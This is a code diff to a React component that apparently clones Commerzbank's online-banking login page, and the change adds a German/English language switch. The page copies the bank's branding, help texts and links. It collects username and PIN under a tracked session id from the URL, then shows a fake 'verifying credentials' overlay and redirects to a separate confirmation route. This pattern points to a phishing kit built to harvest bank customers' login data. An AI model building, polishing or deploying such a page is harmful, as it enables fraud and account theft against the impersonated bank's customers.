@@ -66,11 +66,127 @@ const WarningIcon = () => (
   </svg>
 );
 
+type Lang = "de" | "en";
+
+const COPY = {
+  de: {
+    nav: ["Privatkunden", "Unternehmerkunden", "Wealth Management", "Firmenkunden"],
+    search: "Suche",
+    help: "Hilfe",
+    loginTitle: "Login",
+    userLabel: "Benutzername/Teilnehmernummer",
+    pwLabel: "Passwort/PIN",
+    showPw: "Passwort anzeigen",
+    loginBtn: "Login",
+    userError: "Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.",
+    pwError: "Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.",
+    forgotPw: "Passwort vergessen?",
+    forgotTnr: "Teilnehmernummer vergessen?",
+    register: "Zugang beantragen",
+    digitalInfo: "Wichtige Informationen zum Digital Banking",
+    secTitle: "Wichtige Sicherheitshinweise",
+    sec: [
+      "Angebliche Bank-Mitarbeiter erfragen Zugangsdaten",
+      "Anlagebetrug erkennen und vermeiden",
+      "Warnung vor Phishing",
+      "Phishing-Briefe im Namen der Bank (Quishing)",
+    ],
+    bannerTitle: "24 Stunden für Sie da.",
+    service: "Service",
+    contact: "Kontakt",
+    bankSide: "Die Bank an Ihrer Seite",
+    footer: ["AGB", "Rechtliche Hinweise", "Impressum", "Einwilligungseinstellung", "Konzern", "Karriere"],
+    back: "Zurück zur Übersicht",
+    helpTitle: "Hilfe",
+    accordions: [
+      {
+        title: "Benutzername (Alias)",
+        paragraphs: [
+          'Der Benutzername ist eine von Ihnen frei wählbare Zugangskennung. Diese können Sie nach jeder erfolgreichen Anmeldung vergeben, ändern oder löschen. Nach Vergabe eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) möglich.',
+          'Sollten Sie Ihren Benutzernamen vergessen, können Sie sich jederzeit mit Ihrer 10-stelligen Teilnehmernummer (Banking-ID) anmelden und den Benutzernamen in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" ersehen und ggf. ändern.',
+        ],
+      },
+      {
+        title: "Teilnehmernummer (Banking-ID)",
+        paragraphs: [
+          'Unter der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 10-stellig und losgelöst von Ihrer Kontonummer. Die Teilnehmernummer können Sie sich jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" anzeigen lassen.',
+        ],
+      },
+      {
+        title: "PIN",
+        paragraphs: [
+          "Bitte geben Sie in dieses Feld Ihre 5 bis 45-stellige PIN - Persönliche Identifikationsnummer/Passwort ein.",
+          'Sie erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von Ihrer Commerzbank Filiale. Eine Änderung Ihrer PIN ist unter Verwendung einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Einstellungen" mit der Funktion "Digital Banking PIN ändern" möglich.',
+        ],
+      },
+    ],
+    menuClose: "Menü schließen",
+    langName: "Deutsch",
+    loadingMsg: "Anmeldedaten werden überprüft...",
+  },
+  en: {
+    nav: ["Private Clients", "Business Clients", "Wealth Management", "Corporate Clients"],
+    search: "Search",
+    help: "Help",
+    loginTitle: "Login",
+    userLabel: "Username/Participant number",
+    pwLabel: "Password/PIN",
+    showPw: "Show password",
+    loginBtn: "Login",
+    userError: "Please enter 8 or 10 digits for your participant number or min. 8 to max. 50 characters for your username.",
+    pwError: "Please enter min. 5 to max. 45 letters, digits or special characters.",
+    forgotPw: "Forgotten your password?",
+    forgotTnr: "Forgotten your participant number?",
+    register: "Register for Digital Banking",
+    digitalInfo: "Important Digital Banking information",
+    secTitle: "Important safety instructions",
+    sec: [
+      "Alleged bank employees ask for credentials",
+      "Identify and avoid investment fraud",
+      "Phishing warning",
+      "Phishing letters in the name of the bank (Quishing)",
+    ],
+    bannerTitle: "How can we help?",
+    service: "Service",
+    contact: "Contact",
+    bankSide: "The bank at your side",
+    footer: ["Terms", "Legal Notices", "Imprint", "Consent Management", "Group", "Career"],
+    back: "Back to overview",
+    helpTitle: "Help",
+    accordions: [
+      {
+        title: "Username",
+        paragraphs: [
+          "The username is an access identification which can be freely selected by you. You can allocate, change or delete it after every successful login. After allocation of a username, login can be effected with this username or with the 10-digit participant number.",
+          'If you forget your username, you can log in at any time with your 10-digit participant number and then view, and possibly change, the username in the area "My Online Banking" under the item "Change Username" (Login Name / User Number).',
+        ],
+      },
+      {
+        title: "Participant number",
+        paragraphs: [
+          'The accounts and securities accounts agreed with your Commerzbank branch are managed under the participant number, which has 10 digits. The 10-digit participant number is not connected with your account number. You can also view your participant number at any time in the area "My Online Banking" under the item "Change Username" (Login Name / User Number).',
+        ],
+      },
+      {
+        title: "PIN",
+        paragraphs: [
+          "Please enter your 5 to 45-digits PIN - Personal Identification Number/Password - in this field.",
+          'This PIN will be sent to you by your Commerzbank branch after release for Online Banking. Your PIN can be changed at any time by using a TAN - transaction number - in the area "My Online Banking" under the item "Change PIN".',
+        ],
+      },
+    ],
+    menuClose: "Close menu",
+    langName: "English",
+    loadingMsg: "Verifying login credentials...",
+  },
+} as const;
 
 const Commerzbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
+  const [lang, setLang] = useState<Lang>("de");
+  const t = COPY[lang];
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -85,6 +201,10 @@ const Commerzbank = () => {
   const [userError, setUserError] = useState(false);
   const [pwError, setPwError] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
+
+  const toggleLang = () => setLang((l) => (l === "de" ? "en" : "de"));
+  const langBtn = lang === "de" ? "EN" : "DE";
+  const otherLangName = lang === "de" ? "English" : "Deutsch";
 
   useEffect(() => {
     if (!menuOpen) return;
@@ -134,26 +254,31 @@ const Commerzbank = () => {
     setShowLoading(true);
   };
 
-  const navLinks: { label: string; href: string }[] = [
-    { label: "Privatkunden", href: "https://www.commerzbank.de/privatkunden/" },
-    { label: "Unternehmerkunden", href: "https://www.commerzbank.de/unternehmerkunden/" },
-    { label: "Wealth Management", href: "https://www.commerzbank.de/wealth-management/" },
-    { label: "Firmenkunden", href: "https://www.commerzbank.com/firmenkunden/" },
+  const navHrefs = [
+    "https://www.commerzbank.de/privatkunden/",
+    "https://www.commerzbank.de/unternehmerkunden/",
+    "https://www.commerzbank.de/wealth-management/",
+    "https://www.commerzbank.com/firmenkunden/",
   ];
-  const secLinks: { label: string; href: string }[] = [
-    { label: "Angebliche Bank-Mitarbeiter erfragen Zugangsdaten", href: "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/falsche-commerzbank-mitarbeiter/" },
-    { label: "Anlagebetrug erkennen und vermeiden", href: "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/anlagebetrug/" },
-    { label: "Warnung vor Phishing", href: "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/phishing/" },
-    { label: "Phishing-Briefe im Namen der Bank (Quishing)", href: "https://www.commerzbank.de/konten-zahlungsverkehr/wissen/sicherheit-onlinebanking/phishing-briefe/" },
+  const navLinks = t.nav.map((label, i) => ({ label, href: navHrefs[i] }));
+
+  const secHrefs = [
+    "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/falsche-commerzbank-mitarbeiter/",
+    "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/anlagebetrug/",
+    "https://www.commerzbank.de/hilfe/sicherheit-onlinebanking/phishing/",
+    "https://www.commerzbank.de/konten-zahlungsverkehr/wissen/sicherheit-onlinebanking/phishing-briefe/",
   ];
-  const footerLinks: { label: string; href: string }[] = [
-    { label: "AGB", href: "https://www.commerzbank.de/hinweise/agb/" },
-    { label: "Rechtliche Hinweise", href: "https://www.commerzbank.de/hinweise/rechtliche-hinweise/" },
-    { label: "Impressum", href: "https://www.commerzbank.de/hinweise/impressum/" },
-    { label: "Einwilligungseinstellung", href: "https://kunden.commerzbank.de/#uc-corner-modal-show" },
-    { label: "Konzern", href: "https://www.commerzbank.de/konzern/" },
-    { label: "Karriere", href: "https://www.commerzbank.de/konzern/karriere/" },
+  const secLinks = t.sec.map((label, i) => ({ label, href: secHrefs[i] }));
+
+  const footerHrefs = [
+    "https://www.commerzbank.de/hinweise/agb/",
+    "https://www.commerzbank.de/hinweise/rechtliche-hinweise/",
+    "https://www.commerzbank.de/hinweise/impressum/",
+    "https://kunden.commerzbank.de/#uc-corner-modal-show",
+    "https://www.commerzbank.de/konzern/",
+    "https://www.commerzbank.de/konzern/karriere/",
   ];
+  const footerLinks = t.footer.map((label, i) => ({ label, href: footerHrefs[i] }));
 
   return (
     <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Gotham Sans', 'Montserrat', 'Helvetica Neue', Arial, sans-serif", color: TEXT }}>
@@ -171,13 +296,13 @@ const Commerzbank = () => {
               ))}
             </nav>
             <div className="hidden lg:flex items-center gap-6 text-[14px] font-semibold">
-              <a href="#" className="cmz-lift text-[#dbe2e5] hover:text-white">EN</a>
+              <button type="button" onClick={toggleLang} className="cmz-lift text-[#dbe2e5] hover:text-white">{langBtn}</button>
               <a href="#" className="cmz-lift items-center gap-2 text-[#dbe2e5] hover:text-white">
-                <SearchIcon /> Suche
+                <SearchIcon /> {t.search}
               </a>
             </div>
             <div className="flex lg:hidden items-center gap-5 ml-auto text-white">
-              <button type="button" aria-label="Suche" className="flex items-center justify-center">
+              <button type="button" aria-label={t.search} className="flex items-center justify-center">
                 <SearchIcon />
               </button>
               <button type="button" aria-label="Menü" onClick={() => setMenuOpen(true)} className="flex items-center justify-center">
@@ -197,9 +322,9 @@ const Commerzbank = () => {
         <div className="max-w-[1400px] mx-auto px-6 lg:px-10 pt-10 lg:pt-14 pb-32 lg:pb-40">
           {/* Title row */}
           <div className="flex items-start justify-between mb-16 lg:mb-20">
-            <h1 className="text-[28px] lg:text-[42px] font-bold leading-[1.05] tracking-tight" style={{ color: TEXT }}>Login</h1>
+            <h1 className="text-[28px] lg:text-[42px] font-bold leading-[1.05] tracking-tight" style={{ color: TEXT }}>{t.loginTitle}</h1>
             <button type="button" onClick={() => setHelpOpen(true)} className="cmz-lift items-center gap-2 text-[12px] lg:text-[14px] font-semibold" style={{ color: TEXT }}>
-              Hilfe <ChatIcon />
+              {t.help} <ChatIcon />
             </button>
           </div>
 
@@ -224,7 +349,7 @@ const Commerzbank = () => {
                         fontSize: username || userFocus ? 13 : 15,
                       }}
                     >
-                      Benutzername/Teilnehmernummer
+                      {t.userLabel}
                     </label>
                     <input
                       id="cb-user"
@@ -248,7 +373,7 @@ const Commerzbank = () => {
                   {userError && (
                     <div className="mt-2 flex items-start gap-2 text-[14px]" style={{ color: "#c5000e" }}>
                       <WarningIcon />
-                      <span>Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.</span>
+                      <span>{t.userError}</span>
                     </div>
                   )}
                 </div>
@@ -270,7 +395,7 @@ const Commerzbank = () => {
                         fontSize: password || passFocus ? 13 : 15,
                       }}
                     >
-                      Passwort/PIN
+                      {t.pwLabel}
                     </label>
                     <input
                       id="cb-pin"
@@ -300,7 +425,7 @@ const Commerzbank = () => {
                     />
                     <button
                       type="button"
-                      aria-label="Passwort anzeigen"
+                      aria-label={t.showPw}
                       onClick={() => setShowPassword((v) => !v)}
                       className="absolute right-0 bottom-2"
                     >
@@ -310,7 +435,7 @@ const Commerzbank = () => {
                   {pwError && (
                     <div className="mt-2 flex items-start gap-2 text-[14px]" style={{ color: "#c5000e" }}>
                       <WarningIcon />
-                      <span>Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.</span>
+                      <span>{t.pwError}</span>
                     </div>
                   )}
                 </div>
@@ -323,21 +448,21 @@ const Commerzbank = () => {
                   onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#ffc700"; }}
                   onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = YELLOW; }}
                 >
-                  Login <ArrowRight color={TEXT} size={20} />
+                  {t.loginBtn} <ArrowRight color={TEXT} size={20} />
                 </button>
 
                 {/* Secondary links */}
                 <div className="mt-10 space-y-4 text-[12px] lg:text-[14px]">
                   <div className="flex flex-wrap gap-x-10 gap-y-3">
-                    <a href="https://kunden.commerzbank.de/service/online-banking-pin-vergessen-was-muss-ich-tun/" target="_blank" rel="noopener noreferrer" className="lg:cmz-lift font-semibold inline-block" style={{ color: TEXT }}>Passwort vergessen?</a>
-                    <a href="https://kunden.commerzbank.de/prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST01_TNR_anfordern" target="_blank" rel="noopener noreferrer" className="lg:cmz-lift font-semibold inline-block" style={{ color: TEXT }}>Teilnehmernummer vergessen?</a>
+                    <a href="https://kunden.commerzbank.de/service/online-banking-pin-vergessen-was-muss-ich-tun/" target="_blank" rel="noopener noreferrer" className="lg:cmz-lift font-semibold inline-block" style={{ color: TEXT }}>{t.forgotPw}</a>
+                    <a href="https://kunden.commerzbank.de/prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST01_TNR_anfordern" target="_blank" rel="noopener noreferrer" className="lg:cmz-lift font-semibold inline-block" style={{ color: TEXT }}>{t.forgotTnr}</a>
                   </div>
                   <a href="https://kunden.commerzbank.de/prozess/WebObjects/ProzessCenter.woa/wa/default?path=/pk_sp/de/TNV/ST10_TNV_Anmeldung_DigitalBanking_AutoIdent_Int" target="_blank" rel="noopener noreferrer" className="lg:cmz-lift inline-flex items-center gap-2 font-semibold" style={{ color: TEXT }}>
-                    Zugang beantragen <span className="lg:hidden"><ArrowRight size={18} color="#876c0e" /></span><span className="hidden lg:inline"><ArrowRight size={22} color={TEXT} /></span>
+                    {t.register} <span className="lg:hidden"><ArrowRight size={18} color="#876c0e" /></span><span className="hidden lg:inline"><ArrowRight size={22} color={TEXT} /></span>
                   </a>
                   <div>
                     <a href="#" className="lg:cmz-lift inline-flex items-center gap-2 font-semibold" style={{ color: TEXT }}>
-                      Wichtige Informationen zum Digital Banking <span className="lg:hidden"><ArrowRight size={18} color="#876c0e" /></span><span className="hidden lg:inline"><ArrowRight size={22} color={TEXT} /></span>
+                      {t.digitalInfo} <span className="lg:hidden"><ArrowRight size={18} color="#876c0e" /></span><span className="hidden lg:inline"><ArrowRight size={22} color={TEXT} /></span>
                     </a>
                   </div>
                 </div>
@@ -347,7 +472,7 @@ const Commerzbank = () => {
             {/* Right column: security hints */}
             <aside>
               <h2 className="text-[15px] lg:text-[20px] font-bold mb-6" style={{ color: TEXT }}>
-                Wichtige Sicherheitshinweise
+                {t.secTitle}
               </h2>
               <ul className="space-y-4 text-[12px] lg:text-[14px]">
                 {secLinks.map((l) => (
@@ -363,25 +488,25 @@ const Commerzbank = () => {
         </div>
       </main>
 
-      {/* Yellow banner — only top ~25% ragt in den weißen Bereich, Rest sitzt auf Grün */}
+      {/* Yellow banner */}
       <section style={{ backgroundColor: GREEN }} className="relative z-10">
         <div className="max-w-[1400px] mx-auto px-6 lg:px-10">
           <div style={{ backgroundColor: YELLOW, marginTop: '-56px' }} className="rounded-2xl px-6 lg:px-14 py-10 flex flex-col lg:flex-row items-center lg:justify-between gap-8 lg:gap-6 text-center lg:text-left">
             <h3 className="text-[18px] lg:text-[20px] font-semibold w-full lg:w-auto" style={{ color: TEXT }}>
-              24 Stunden für Sie da.
+              {t.bannerTitle}
             </h3>
             <div className="flex items-center justify-center gap-10 w-full lg:w-auto">
               <a href="https://www.commerzbank.de/service/" target="_blank" rel="noopener noreferrer" className="cmz-circle flex flex-col items-center gap-2" style={{ color: TEXT }}>
                 <span className="cmz-circle-ring w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                   <ServiceIcon />
                 </span>
-                <span className="text-[13px] font-semibold">Service</span>
+                <span className="text-[13px] font-semibold">{t.service}</span>
               </a>
               <a href="https://www.commerzbank.de/kontakt/" target="_blank" rel="noopener noreferrer" className="cmz-circle flex flex-col items-center gap-2" style={{ color: TEXT }}>
                 <span className="cmz-circle-ring w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                   <MailIcon />
                 </span>
-                <span className="text-[13px] font-semibold">Kontakt</span>
+                <span className="text-[13px] font-semibold">{t.contact}</span>
               </a>
             </div>
           </div>
@@ -395,7 +520,7 @@ const Commerzbank = () => {
             <div className="flex items-center justify-center gap-3">
               <img src={logoWhiteAsset.url} alt="Commerzbank" className="h-6 lg:h-9 w-auto" />
             </div>
-            <div className="text-[12px] lg:text-[14px] font-semibold text-[#dbe2e5] hover:text-white transition-colors">Die Bank an Ihrer Seite</div>
+            <div className="text-[12px] lg:text-[14px] font-semibold text-[#dbe2e5] hover:text-white transition-colors">{t.bankSide}</div>
           </div>
           <div className="border-t border-white/20 pt-10">
             <ul className="flex flex-wrap justify-center lg:justify-start gap-x-6 lg:gap-x-8 gap-y-3 text-[10px] lg:text-[12px] font-semibold text-center">
@@ -437,46 +562,19 @@ const Commerzbank = () => {
             <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
               <path d="M15.41 7.41 14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
             </svg>
-            Zurück zur Übersicht
+            {t.back}
           </button>
         </div>
         <div className="flex-1 overflow-y-auto px-[163px] pt-12 pb-8">
-          <h2 className="text-[18px] font-bold mb-6" style={{ color: TEXT }}>Hilfe</h2>
-          {[
-            {
-              id: "alias",
-              title: "Benutzername (Alias)",
-              body: (
-                <>
-                  <p>Der Benutzername ist eine von Ihnen frei wählbare Zugangskennung. Diese können Sie nach jeder erfolgreichen Anmeldung vergeben, ändern oder löschen. Nach Vergabe eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) möglich.</p>
-                  <p className="mt-4">Sollten Sie Ihren Benutzernamen vergessen, können Sie sich jederzeit mit Ihrer 10-stelligen Teilnehmernummer (Banking-ID) anmelden und den Benutzernamen in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" ersehen und ggf. ändern.</p>
-                </>
-              ),
-            },
-            {
-              id: "tnr",
-              title: "Teilnehmernummer (Banking-ID)",
-              body: (
-                <p>Unter der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 10-stellig und losgelöst von Ihrer Kontonummer. Die Teilnehmernummer können Sie sich jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" anzeigen lassen.</p>
-              ),
-            },
-            {
-              id: "pin",
-              title: "PIN",
-              body: (
-                <>
-                  <p>Bitte geben Sie in dieses Feld Ihre 5 bis 45-stellige PIN - Persönliche Identifikationsnummer/Passwort ein.</p>
-                  <p className="mt-4">Sie erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von Ihrer Commerzbank Filiale. Eine Änderung Ihrer PIN ist unter Verwendung einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Einstellungen" mit der Funktion "Digital Banking PIN ändern" möglich.</p>
-                </>
-              ),
-            },
-          ].map((item) => {
-            const isOpen = openPanel === item.id;
+          <h2 className="text-[18px] font-bold mb-6" style={{ color: TEXT }}>{t.helpTitle}</h2>
+          {t.accordions.map((item, idx) => {
+            const id = String(idx);
+            const isOpen = openPanel === id;
             return (
-              <div key={item.id} className="border-b border-black/10">
+              <div key={id} className="border-b border-black/10">
                 <button
                   type="button"
-                  onClick={() => setOpenPanel(isOpen ? null : item.id)}
+                  onClick={() => setOpenPanel(isOpen ? null : id)}
                   className="group w-full flex items-center justify-between py-5 px-3 -mx-3 rounded-lg text-left text-[18px] font-bold transition-colors duration-200 hover:bg-black/5"
                   style={{ color: TEXT }}
                 >
@@ -504,7 +602,9 @@ const Commerzbank = () => {
                 >
                   <div className="overflow-hidden">
                     <div className="pb-5 pl-3 text-[17px] leading-relaxed" style={{ color: TEXT }}>
-                      {item.body}
+                      {item.paragraphs.map((p, i) => (
+                        <p key={i} className={i === 0 ? "" : "mt-4"}>{p}</p>
+                      ))}
                     </div>
                   </div>
                 </div>
@@ -525,7 +625,7 @@ const Commerzbank = () => {
         aria-hidden={!menuOpen}
       >
         <div className="flex items-center justify-end px-6 py-5" style={{ backgroundColor: "#103d4b" }}>
-          <button type="button" aria-label="Menü schließen" onClick={() => setMenuOpen(false)} className="text-white">
+          <button type="button" aria-label={t.menuClose} onClick={() => setMenuOpen(false)} className="text-white">
             <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="square" aria-hidden="true">
               <line x1="5" y1="5" x2="19" y2="19" />
               <line x1="19" y1="5" x2="5" y2="19" />
@@ -536,11 +636,11 @@ const Commerzbank = () => {
           <div className="h-px w-56 bg-white/20" />
           <div className="py-6 space-y-5">
             <a href="#" className="flex items-center gap-3 text-[15px] font-semibold text-[#dbe2e5]">
-              <SearchIcon /> Suche
+              <SearchIcon /> {t.search}
             </a>
-            <a href="#" className="flex items-center gap-4 text-[15px] font-semibold text-[#dbe2e5]">
-              <span>EN</span><span>English</span>
-            </a>
+            <button type="button" onClick={toggleLang} className="flex items-center gap-4 text-[15px] font-semibold text-[#dbe2e5]">
+              <span>{langBtn}</span><span>{otherLangName}</span>
+            </button>
           </div>
           <div className="h-px w-56 bg-white/20" />
           <nav className="pt-8 space-y-6 text-[15px] font-semibold">
@@ -555,7 +655,7 @@ const Commerzbank = () => {
 
       {showLoading && (
         <LoadingOverlay
-          message="Anmeldedaten werden überprüft..."
+          message={t.loadingMsg}
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
